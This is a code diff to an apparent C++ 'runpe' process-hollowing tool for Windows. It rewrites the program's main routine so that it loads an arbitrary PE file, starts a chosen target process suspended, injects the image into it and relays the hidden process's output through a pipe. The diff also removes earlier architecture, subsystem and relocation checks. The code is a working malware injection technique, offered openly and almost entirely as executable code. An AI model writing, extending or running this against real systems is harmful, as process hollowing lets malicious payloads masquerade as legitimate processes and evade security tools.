@@ -1,4 +1,4 @@
-#include <Windows.h>
+﻿#include <Windows.h>
 #include <cstdio>
 #include <winternl.h>
 
@@ -699,204 +699,68 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	return TRUE;
 }
 
-int main(const int argc, char* argv[])
-{
-	if (argc == 3)
-	{
-		lpSourceImage = argv[1];
-		lpTargetProcess = argv[2];
-	}
-	else
-	{
-		printf("[HELP] runpe.exe <pe_file> <target_process>\n");
-		return -1;
-	}
+int main(int argc, char* argv[]) {
+	if (argc != 3) { printf("[HELP] runpe.exe <pe_file> <target_process>\n"); return -1; }
+	lpSourceImage = argv[1];
+	lpTargetProcess = argv[2];
 
 	printf("[PROCESS HOLLOWING]\n");
-
-	const LPVOID hFileContent = GetFileContent(lpSourceImage);
-	if (hFileContent == nullptr)
-		return -1;
-
-	printf("[+] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hFileContent);
-
-	const BOOL bPE = IsValidPE(hFileContent);
-	if (!bPE)
-	{
-		printf("[-] The PE file is not valid !\n");
-		if (hFileContent != nullptr)
-			HeapFree(GetProcessHeap(), 0, hFileContent);
-		return -1;
-	}
-
+	LPVOID hFileContent = GetFileContent(lpSourceImage);
+	if (!hFileContent) return -1;
+	printf("[+] PE file content : 0x%p\n", hFileContent);
+	if (!IsValidPE(hFileContent)) { printf("[-] The PE file is not valid!\n"); HeapFree(GetProcessHeap(), 0, hFileContent); return -1; }
 	printf("[+] The PE file is valid.\n");
 
-	STARTUPINFOA SI;
-	PROCESS_INFORMATION PI;
+	SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
+	HANDLE childOutR = NULL, childOutW = NULL;
+	CreatePipe(&childOutR, &childOutW, &sa, 0);
+	SetHandleInformation(childOutR, HANDLE_FLAG_INHERIT, 0);
 
+	STARTUPINFOA SI;
 	ZeroMemory(&SI, sizeof(SI));
 	SI.cb = sizeof(SI);
+	SI.dwFlags = STARTF_USESTDHANDLES;
+	SI.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+	SI.hStdOutput = childOutW;
+	SI.hStdError = childOutW;
+
+	PROCESS_INFORMATION PI;
 	ZeroMemory(&PI, sizeof(PI));
-
-	const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
-	if (!bProcessCreation)
-	{
-		printf("[-] An error is occured when trying to create the target process !\n");
-		CleanAndExitProcess(&PI, hFileContent);
-		return -1;
-	}
-
-	BOOL bTarget32;
-	IsWow64Process(PI.hProcess, &bTarget32);
-
-	ProcessAddressInformation ProcessAddressInformation = {nullptr, nullptr};
-	if (bTarget32)
-	{
-		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
-		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
-		{
-			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
-			CleanAndExitProcess(&PI, hFileContent);
-			return -1;
-		}
-	}
-	else
-	{
-		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
-		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
-		{
-			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
-			CleanAndExitProcess(&PI, hFileContent);
-			return -1;
-		}
-	}
-
-	printf("[+] Target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
-	printf("[+] Target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);
-
-	const BOOL bSource32 = IsPE32(hFileContent);
-	if (bSource32)
-		printf("[+] Source PE Image architecture : x86\n");
-	else
-		printf("[+] Source PE Image architecture : x64\n");
-
-	if (bTarget32)
-		printf("[+] Target PE Image architecture : x86\n");
-	else
-		printf("[+] Target PE Image architecture : x64\n");
-
-	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
-		printf("[+] Architecture are compatible !\n");
-	else
-	{
-		printf("[-] Architecture are not compatible !\n");
-		return -1;
-	}
-
-	DWORD dwSourceSubsystem;
-	if (bSource32)
-		dwSourceSubsystem = GetSubsytem32(hFileContent);
-	else
-		dwSourceSubsystem = GetSubsytem64(hFileContent);
-
-	if (dwSourceSubsystem == (DWORD)-1)
-	{
-		printf("[-] An error is occured when trying to get the subsytem of the source image.\n");
-		CleanAndExitProcess(&PI, hFileContent);
-		return -1;
-	}
-
-	printf("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);
-
-	DWORD dwTargetSubsystem;
-	if (bTarget32)
-		dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
-	else
-		dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
-
-	if (dwTargetSubsystem == (DWORD)-1)
-	{
-		printf("[-] An error is occured when trying to get the subsytem of the target process.\n");
-		CleanAndExitProcess(&PI, hFileContent);
-		return -1;
-	}
-
-	printf("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);
-
-	if (dwSourceSubsystem == dwTargetSubsystem)
-		printf("[+] Subsytems are compatible.\n");
-	else
-	{
-		printf("[-] Subsytems are not compatible.\n");
-		CleanAndExitProcess(&PI, hFileContent);
-		return -1;
-	}
-
-	BOOL bHasReloc;
-	if (bSource32)
-		bHasReloc = HasRelocation32(hFileContent);
-	else
-		bHasReloc = HasRelocation64(hFileContent);
-
-	if (!bHasReloc)
-		printf("[+] The source image doesn't have a relocation table.\n");
-	else
-		printf("[+] The source image has a relocation table.\n");
-
-
-	if (bSource32 && !bHasReloc)
-	{
-		if (RunPE32(&PI, hFileContent))
-		{
-			printf("[+] The injection has succeed !\n");
-			CleanProcess(&PI, hFileContent);
-			return 0;
-		}
-	}
-
-	if (bSource32 && bHasReloc)
-	{
-		if (RunPEReloc32(&PI, hFileContent))
-		{
-			printf("[+] The injection has succeed !\n");
-			CleanProcess(&PI, hFileContent);
-			return 0;
-		}
-	}
-
-	if (!bSource32 && !bHasReloc)
-	{
-		if (RunPE64(&PI, hFileContent))
-		{
-			printf("[+] The injection has succeed !\n");
-			CleanProcess(&PI, hFileContent);
-			return 0;
-		}
-	}
-
-	if (!bSource32 && bHasReloc)
-	{
-		if (RunPEReloc64(&PI, hFileContent))
-		{
-			printf("[+] The injection has succeed !\n");
-			CleanProcess(&PI, hFileContent);
-			return 0;
-		}
-	}
-	
-	printf("[-] The injection has failed !\n");
-
-	if (hFileContent != nullptr)
+	if (!CreateProcessA(
+		NULL,
+		lpTargetProcess,
+		NULL, NULL,
+		TRUE,
+		CREATE_SUSPENDED,
+		NULL, NULL,
+		&SI, &PI
+	)) {
+		printf("[-] CreateProcessA failed\n");
+		CloseHandle(childOutR);
+		CloseHandle(childOutW);
 		HeapFree(GetProcessHeap(), 0, hFileContent);
+		return -1;
+	}
+	CloseHandle(childOutW);
 
-	if (PI.hThread != nullptr)
-		CloseHandle(PI.hThread);
-
-	if (PI.hProcess != nullptr)
-	{
-		TerminateProcess(PI.hProcess, -1);
-		CloseHandle(PI.hProcess);
+	bool injected = false;
+	if (!IsPE32(hFileContent)) { injected = RunPE64(&PI, hFileContent); }
+	else { injected = RunPE32(&PI, hFileContent); }
+	if (!injected) {
+		printf("[-] Injection failed!\n");
+		CleanAndExitProcess(&PI, hFileContent);
+		CloseHandle(childOutR);
+		return -1;
 	}
 
-	return -1;
+	CHAR buf[4096];
+	DWORD n;
+	while (ReadFile(childOutR, buf, sizeof(buf) - 1, &n, NULL) && n) {
+		buf[n] = '\0';
+		printf("%s", buf);
+	}
+
+	CleanProcess(&PI, hFileContent);
+	CloseHandle(childOutR);
+	return 0;
 }
